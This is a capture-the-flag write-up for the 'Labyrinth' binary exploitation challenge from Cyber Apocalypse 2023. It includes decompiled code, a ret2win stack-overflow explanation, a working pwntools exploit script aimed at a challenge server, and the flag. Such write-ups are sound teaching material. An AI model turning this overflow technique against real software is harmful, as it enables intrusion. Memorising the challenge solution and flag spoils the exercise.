# Cyber Apocalypse 2023

## Labyrinth

> You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences.
>
>  Author: N/A
>
> [`pwn_labyrinth.zip`](pwn_labyrinth.zip)

Tags: _pwn_

## Solution
The chellange comes with the executable that runs as the service we need to pwn. The first thing is to check what security measurements are in place. In this case no stack canary was found that allows to easily overwrite the return address.

```bash
$ checksec labyrinth
[*] '/home/user/cyberapoc23/pwn/labyrinth/challenge/labyrinth'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

After this we need to get more insight in what the programm is doing. So opening the executable in Ghidra and starting at `main`.

```c++
undefined8 main(void)
{
  int iVar1;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  char *local_18;
  ulong local_10;
  
  setup();
  banner();
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  fwrite("\nSelect door: \n\n",1,0x10,stdout);
  for (local_10 = 1; local_10 < 0x65; local_10 = local_10 + 1) {
    if (local_10 < 10) {
      fprintf(stdout,"Door: 00%d ",local_10);
    }
    else if (local_10 < 100) {
      fprintf(stdout,"Door: 0%d ",local_10);
    }
    else {
      fprintf(stdout,"Door: %d ",local_10);
    }
    if ((local_10 % 10 == 0) && (local_10 != 0)) {
      putchar(10);
    }
  }
  fwrite(&DAT_0040248f,1,4,stdout);
  local_18 = (char *)malloc(0x10);
  fgets(local_18,5,stdin);
  iVar1 = strncmp(local_18,"69",2);
  if (iVar1 != 0) {
    iVar1 = strncmp(local_18,"069",3);
    if (iVar1 != 0) goto LAB_004015da;
  }
  fwrite("\nYou are heading to open the door but you suddenly see something on the wall:\n\n\"Fly like a bird and be free!\"\n\nWould you like to change the door you chose?\n\n>> "
         ,1,0xa0,stdout);
  fgets((char *)&local_38,0x44,stdin);
LAB_004015da:
  fprintf(stdout,"\n%s[-] YOU FAILED TO ESCAPE!\n\n",&DAT_00402541);
  return 0;
}
```

The first stage is easy. By choosing the door `69` we are on our way out. But no flag is displayed, so something is missing. Further looking into the decompiled code we find the function `escape_plan`.

```c++
void escape_plan(void)

{
  ssize_t sVar1;
  char local_d;
  int local_c;
  
  putchar(10);
  fwrite(&DAT_00402018,1,0x1f0,stdout);
  fprintf(stdout,
          "\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey: %s\n"
          ,&DAT_0040220e,&DAT_00402209);
  local_c = open("./flag.txt",0);
  if (local_c < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n\n");
                    // WARNING: Subroutine does not return
    exit(1);
  }
  while( true ) {
    sVar1 = read(local_c,&local_d,1);
    if (sVar1 < 1) break;
    fputc((int)local_d,stdout);
  }
  close(local_c);
  return;
}
```

Here the flag is printed to screen, but the function is never called. So we need to call the function ourself by overriding the return address (ret2win). When the processor tries to leave `main` it is redirected to `escape_plan` and we get the flag. For this we need to know where the return address is located on the stack. This can typically be done with trial and error by generating repeating patterns for input and checking memory location where the patterns are found. Another way is to just check with Ghidra. Our input is written to `local_38` and here Ghidra already gives us the offset we need to know. So writing a small [`script`](exploit.py) to solve the challenge.

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF("./labyrinth", checksec=False)

if args.REMOTE:
    p = remote("165.227.224.40", 31834)
else:
    p = process(binary.path)

p.sendlineafter(b">> ", b"69")
payload = b"A"*0x38
payload += p64(binary.sym.escape_plan+1)
p.sendlineafter(b">> ", payload)
print(p.recvall().decode())
```

Flag `HTB{3sc4p3_fr0m_4b0v3}`